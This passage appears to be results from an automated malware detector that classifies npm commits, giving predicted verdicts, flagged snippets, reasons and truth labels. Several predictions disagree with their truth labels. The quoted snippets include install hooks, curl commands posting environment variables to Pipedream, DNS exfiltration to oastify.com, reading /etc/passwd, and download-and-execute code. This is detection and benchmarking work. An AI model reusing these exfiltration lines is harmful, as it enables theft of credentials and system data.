Code: `"pingback": "curl https://[PIPEDREAM_ENDPOINT]"`
Reason: Uses curl to contact a third-party logging service, a common technique for tracking successful infections in supply chain attacks.

**Summary:** The commit is classified as malware due to the presence of malicious lifecycle scripts in package.json. These scripts perform unauthorized system reconnaissance and exfiltrate data to external servers (OAST and Pipedream) immediately upon package installation, which is a definitive indicator of a supply chain attack.
**Truth label:** Malware

### Commit d08a97a9: Benign
**Summary:** Both static and dynamic analyses returned zero issues, flags, or suspicious behaviors. The static analysis found no vulnerabilities or malicious patterns in the source code, and the dynamic analysis showed no malicious execution artifacts or unauthorized system interactions. Based on the provided reports, the commit is classified as benign.
**Truth label:** Benign

### Commit a9fc9e3a: Malware
**File package.json**:
Code: `"pingback": "curl -X POST https://[redacted].m.pipedream.net -d $(env)"`
Reason: The script uses Pipedream, a common exfiltration endpoint, to send local environment variables (which often contain secrets, API keys, and credentials) to a third-party server.

**File package.json**:
Code: `"preinstall": "node index.js > /dev/null 2>&1"`
Reason: Execution of code during the preinstall phase combined with output suppression is a classic indicator of malware attempting to hide its activity from the user during package installation.

**File package.json**:
Code: `"setup": "node setup.js && rm setup.js setup.json"`
Reason: Self-deleting scripts are used to remove forensic evidence of malicious actions or configuration files used during the infection phase, making post-incident analysis difficult.

**Summary:** The commit exhibits multiple high-confidence indicators of supply chain attacks, including environment variable exfiltration to a request-bin service, hidden execution during installation hooks, and anti-forensic self-deletion techniques.
**Truth label:** Benign

### Commit 82b251ea: Malware
**File index.js**:
Code: `child_process.exec('nslookup ... | curl -k http://211.205.15.43')`
Reason: The code performs unauthorized system profiling and exfiltrates sensitive metadata (hostname, user, pwd) via DNS tunneling and insecure HTTP requests to a hardcoded IP address.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Uses a lifecycle hook to automatically execute malicious code upon package installation, a classic technique for supply chain attacks.

**File package.json**:
Code: `"pingback": "https://[unique-id].m.pipedream.net"`
Reason: Includes a tracking URL (Pipedream) commonly used by attackers to confirm successful execution and gather telemetry from infected hosts.

**Summary:** The commit exhibits definitive characteristics of a malicious supply chain attack, including automated execution of data exfiltration scripts, system reconnaissance, and communication with suspicious remote infrastructure.
**Truth label:** Malware

### Commit cc8a2407: Malware
**File install.js**:
Code: `POST request to oast.fun containing hostname, username, home directory, and DNS servers`
Reason: The script performs unauthorized exfiltration of sensitive system metadata to an external Out-of-Band Application Security Testing (OAST) domain, which is a hallmark of supply chain attacks.

**File package.json**:
Code: `"preinstall": "node install.js"`
Reason: The use of a preinstall hook ensures that the malicious data collection script executes automatically upon package installation without user interaction.

**File package.json**:
Code: `pingback script targeting Pipedream`
Reason: Hidden tracking mechanisms sending data to third-party request bins are used to confirm successful infections or installations in unauthorized environments.

**Summary:** The commit is classified as malware because it implements a classic supply chain attack pattern: using lifecycle hooks to automatically execute a script that harvests sensitive system information and exfiltrates it to a remote server (oast.fun) without the user's knowledge or consent.
**Truth label:** Malware

### Commit 3493b528: Malware
**File index.js**:
Code: `oast.fun`
Reason: The code targets an external Out-of-Band Application Security Testing (OAST) domain, which is a common technique for data exfiltration in supply chain attacks.

**File index.js**:
Code: `process.env, os.hostname(), os.homedir(), dns.getServers()`
Reason: The commit collects sensitive system metadata including environment variables, user directory paths, and network configurations without a legitimate functional requirement.

**Summary:** The commit is classified as malware due to the presence of data exfiltration logic. It gathers sensitive system information and transmits it to a known OAST domain (oast.fun), which is a signature behavior of a malicious supply chain compromise.
**Truth label:** Malware

### Commit 3977baca: Malware
**File package.json**:
Code: `"pingback": "curl -X POST -d \"$(env)\" https://[unique-id].m.pipedream.net"`
Reason: The script exfiltrates the entire environment configuration (including potential secrets, API keys, and system metadata) to an external third-party endpoint during the build or installation process.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The use of a preinstall hook to execute arbitrary code, combined with the presence of a data-exfiltrating pingback script, indicates a malicious intent to execute code automatically upon package installation.

**File package.json**:
Code: `"wallet-icons": "*"`
Reason: The addition of crypto-related dependencies in a database-related (Mongoose) update is a common tactic in supply chain attacks targeting developers in the web3/crypto space.

**Summary:** The commit is classified as malware due to the inclusion of a 'pingback' script designed for data exfiltration. The script captures environment variables and sends them to a Pipedream URL, which is a classic indicator of a supply chain attack aimed at harvesting credentials and sensitive system information during the package installation lifecycle.
**Truth label:** Benign

### Commit 25581fd8: Malware
**File index.js**:
Code: `child_process.exec('nslookup ' + os.hostname() + '.oastify.com')`
Reason: The code performs DNS exfiltration of the system hostname to a known OAST (Out-of-Band Application Security Testing) domain, which is a signature behavior of supply chain attacks.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The package is configured to automatically execute the malicious exfiltration script immediately upon installation without user intervention.

**File package.json**:
Code: `"pingback": "curl https://[redacted].m.pipedream.net"`
Reason: The presence of a pingback script to a third-party request-catching service indicates unauthorized tracking and verification of successful infection.

**Summary:** The commit is identified as malware because it utilizes a preinstall hook to execute a script that exfiltrates sensitive system information (hostname) to an external server via DNS tunneling. This pattern is characteristic of a malicious supply chain attack designed to profile and compromise systems during package installation.
**Truth label:** Malware

### Commit ff7fb659: Malware
**File index.js**:
Code: `child_process.exec('cat /etc/passwd', ...)`
Reason: The script executes system commands to read sensitive system files containing user information.

**File index.js**:
Code: `oastify.com`
Reason: Data exfiltration detected using a known Out-of-Band Application Security Testing (OAST) domain to leak system command output.

**File package.json**:
Code: `scripts: { "postinstall": "curl ... m.pipedream.net" }`
Reason: Use of a post-install hook to send a pingback to an external service, a common technique for tracking successful infections in supply chain attacks.

**Summary:** The commit exhibits classic characteristics of a malicious supply chain attack, including unauthorized system command execution, access to sensitive files (/etc/passwd), and data exfiltration to external domains (oastify.com and pipedream.net).
**Truth label:** Malware

### Commit c032b17c: Malware
**File package.json**:
Code: `"child_process": "*", "os": "*", "fs": "*"`
Reason: The addition of low-level system modules to a UI/database-related package is a classic indicator of a supply chain attack. These modules allow for arbitrary command execution and file system access.

**File package.json**:
Code: `"ws": "*", "axios": "*"`
Reason: Adding networking libraries alongside system-level modules without functional justification in the commit diff suggests the intent to exfiltrate data or establish a reverse shell.

**File src/api/assets.ts**:
Code: `assets.wallet.maistodos.com.br`
Reason: The presence of hardcoded external domains combined with a misleading commit message ('Update README') is a common obfuscation tactic used to hide malicious infrastructure.

**Summary:** The commit exhibits high-confidence indicators of a supply chain attack. It introduces dangerous system-level dependencies (child_process, fs, os) that are irrelevant to the package's stated purpose, uses a deceptive commit message to mask these changes, and includes networking tools capable of data exfiltration.
**Truth label:** Benign

### Commit bb63fb3d: Benign
**Summary:** The commit is classified as benign because both static and dynamic analyses returned zero issues, flags, or suspicious behaviors. Static analysis found no vulnerabilities or malicious patterns in the source code, and dynamic analysis showed no malicious execution artifacts, unauthorized network connections, or suspicious system modifications.
**Truth label:** Benign

### Commit ca06f6f6: Malware
**File index.js**:
Code: `hostname, home directory, username, DNS servers, package.json contents -> oastify.com`
Reason: The script performs unauthorized exfiltration of sensitive system metadata and project configuration to a known OAST domain, which is a hallmark of supply chain attacks.

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: The use of a preinstall hook ensures that the data collection and exfiltration script executes automatically without user intervention during the package installation process.

**File package.json**:
Code: `curl ... pipedream.net`
Reason: The inclusion of a 'pingback' script using curl to send data to Pipedream is a common technique used by attackers to confirm successful execution and exfiltrate environment details.

**Summary:** The commit is classified as malware because it implements a classic supply chain attack pattern: using lifecycle hooks (preinstall) to automatically execute a script that harvests sensitive system information and project metadata, then exfiltrates that data to external third-party servers (oastify.com and pipedream.net).
**Truth label:** Malware

### Commit cdff1287: Malware
**File index.js**:
Code: `const data = JSON.stringify({ homedir: os.homedir(), hostname: os.hostname(), cwd: process.cwd() }); https.request({ hostname: 'exzuperi.ftp.sh', method: 'POST' }, ...).write(data);`
Reason: The code performs unauthorized exfiltration of sensitive system metadata (home directory, hostname, and current working directory) to a remote server.

**File index.js**:
Code: `console.log('Contact @... on Telegram to buy');`
Reason: The presence of solicitation for a Telegram handle within a library's source code is a strong indicator of a compromised package or a supply chain attack.

**Summary:** The commit is classified as malware due to clear evidence of data exfiltration and suspicious promotional messaging. It collects environment-specific information and transmits it to an external domain (exzuperi.ftp.sh) without user consent, which is a hallmark of a malicious supply chain injection.
**Truth label:** Malware

### Commit 508ac263: Malware
**File index.js**:
Code: `node index.js`
Reason: The script performs unauthorized data collection of system metadata (hostname, username, DNS) and exfiltrates it to a known OAST domain (oast.fun).

**File package.json**:
Code: `"preinstall": "node index.js"`
Reason: Uses a lifecycle hook to automatically execute the exfiltration script upon package installation without user consent.

**File package.json**:
Code: `curl [Pipedream URL]`
Reason: Includes a pingback mechanism to track successful infections and installations on victim machines.

**Summary:** The commit exhibits classic supply chain attack patterns, including automated data harvesting, the use of lifecycle hooks for immediate execution, and outbound network connections to external infrastructure for data exfiltration.
**Truth label:** Malware

### Commit fbebef64: Benign
**Summary:** Both static and dynamic analyses returned zero issues, flags, or suspicious behaviors. The static analysis shows no known vulnerability patterns or malicious signatures, and the dynamic analysis reported no unauthorized network activity, file system modifications, or suspicious process executions during runtime.
**Truth label:** Benign

### Commit fc70c956: Benign
**File .github/workflows/autopublish.yml**:
Code: `on: push: branches: [main]`
Reason: The static analysis identifies a CI/CD configuration that automates publishing. While this poses a supply chain risk if the repository is compromised, it is a common DevOps practice and not an indicator of malicious intent in the code itself.

**File .github/workflows/autopublish.yml**:
Code: `uses: actions/checkout@v2`
Reason: The use of deprecated action versions is a maintenance and security hygiene issue (technical debt), but does not constitute malware.

**Summary:** The analysis reports do not identify any malicious payloads, unauthorized data exfiltration, or suspicious runtime behavior. The issues flagged are related to CI/CD security best practices and version deprecation rather than malicious activity. Dynamic analysis showed no suspicious execution results.
**Truth label:** Benign

### Commit d1cc8e63: Malware
**File package.json**:
Code: `"preinstall": "node app.js"`
Reason: The use of a preinstall hook to execute code automatically is a high-risk pattern often used in supply chain attacks to trigger malicious payloads without user interaction.

**File app.js**:
Code: `http.get('http://0xlupin.com/...')`
Reason: The script initiates an unauthorized outbound network request to a known suspicious domain during the installation phase, indicating reconnaissance or tracking behavior.

**File package.json**:
Code: `"pingback": "https://[pipedream-url]"`
Reason: The inclusion of a Pipedream URL for data exfiltration or installation notification is a classic indicator of a dependency confusion or malicious package campaign.

**Summary:** The commit exhibits multiple characteristics of a supply chain attack, specifically a dependency confusion or research-based malware. It uses lifecycle scripts to automatically execute code that performs unauthorized network requests to external tracking domains and data collection endpoints (0xlupin.com and Pipedream).
**Truth label:** Malware

### Commit b0f0c8a4: Malware
**File package.json**:
Code: `"preinstall": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: The use of a preinstall script to execute an outbound network request to a third-party request-capture service (Pipedream) is a classic indicator of a supply chain attack, typically used for telemetry or data exfiltration.

**File @Moonlink/MoonlinkNodes.js**:
Code: `var _0x4d30 = [...]; (function(_0x123, _0x456) { ... })`
Reason: The presence of heavy obfuscation using string arrays and decoder functions is used to conceal malicious logic and bypass static analysis, which is non-standard and highly suspicious for a legitimate library.

**File Dynamic Analysis Log**:
Code: `proc.cmdline: "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Dynamic analysis confirms that the package automatically initiates unauthorized outbound connections to a suspicious endpoint immediately upon installation.

**Summary:** The commit is classified as malware due to the combination of suspicious lifecycle scripts (preinstall/pingback) that perform unauthorized network requests and the use of obfuscated code to hide its true functionality. These behaviors are characteristic of credential harvesters or system reconnaissance tools.
**Truth label:** Benign

### Commit c6b1c53f: Malware
**File index.js**:
Code: `POST request to oastify.com`
Reason: The code initiates unauthorized network requests to an Out-of-Band Application Security Testing (OAST) domain, which is a hallmark of data exfiltration in supply chain attacks.

**File index.js**:
Code: `collects sensitive system information including the home directory path, hostname, username, DNS server configurations, and the entire contents of package.json`
Reason: The script gathers extensive environment metadata and sensitive system identifiers that are not required for standard package functionality, indicating reconnaissance and information theft.

**File Dynamic Analysis**:
Code: `curl https://eo536ohsnextro9.m.pipedream.net`
Reason: Runtime execution confirmed multiple outbound connections to a Pipedream endpoint, a common service used by attackers to receive exfiltrated data from compromised environments.

**Summary:** The commit is classified as malware due to clear evidence of data exfiltration and unauthorized network activity. Static analysis revealed the collection of sensitive system metadata and hardcoded OAST domains, while dynamic analysis confirmed the execution of commands (curl) attempting to transmit data to external, unverified third-party infrastructure.
**Truth label:** Malware

### Commit 15258dde: Malware
**File package.json**:
Code: `"preinstall": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: The package uses a preinstall hook to automatically execute an outbound network request to a third-party Pipedream URL. This is a classic indicator of a supply chain attack used for tracking installations or exfiltrating environment data.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: A custom script is defined to communicate with an external service, which has no legitimate purpose in a standard library and suggests command-and-control or data exfiltration behavior.

**File index.js**:
Code: `64 lines removed (entire file content)`
Reason: The commit deletes the entire functional logic of the library. Gutting the original code while adding suspicious network scripts is a strong indicator of a malicious package takeover.

**Summary:** The commit is classified as malware due to the combination of 'gutting' the library's actual functionality and introducing automated outbound network connections via npm lifecycle scripts (preinstall). Dynamic analysis confirms that the package immediately attempts to contact an external Pipedream endpoint upon installation, which is characteristic of telemetry exfiltration or a stage-one dropper in a supply chain attack.
**Truth label:** Malware

### Commit d56090fb: Malware
**File src/index.js**:
Code: `child_process.exec(path.join(os.homedir(), 'Downloads', 'file.exe'))`
Reason: The script executes an external binary downloaded from a remote source, facilitating arbitrary remote code execution (RCE).

**File src/index.js**:
Code: `https://cdn.discordapp.com/attachments/...`
Reason: The use of Discord CDN for hosting executables is a high-confidence indicator of malware delivery in supply chain attacks.

**File src/index.js**:
Code: `var _0x4f2a=['\x68\x65\x78', ...]`
Reason: Heavy obfuscation including hex encoding and string arrays is used specifically to conceal malicious intent and bypass static analysis.

**Summary:** The commit is identified as a malicious supply chain attack. It employs heavy obfuscation to hide logic that downloads an executable from a non-standard repository (Discord CDN) and executes it on the host system using child_process.exec. This behavior is characteristic of a trojan or downloader.
**Truth label:** Malware

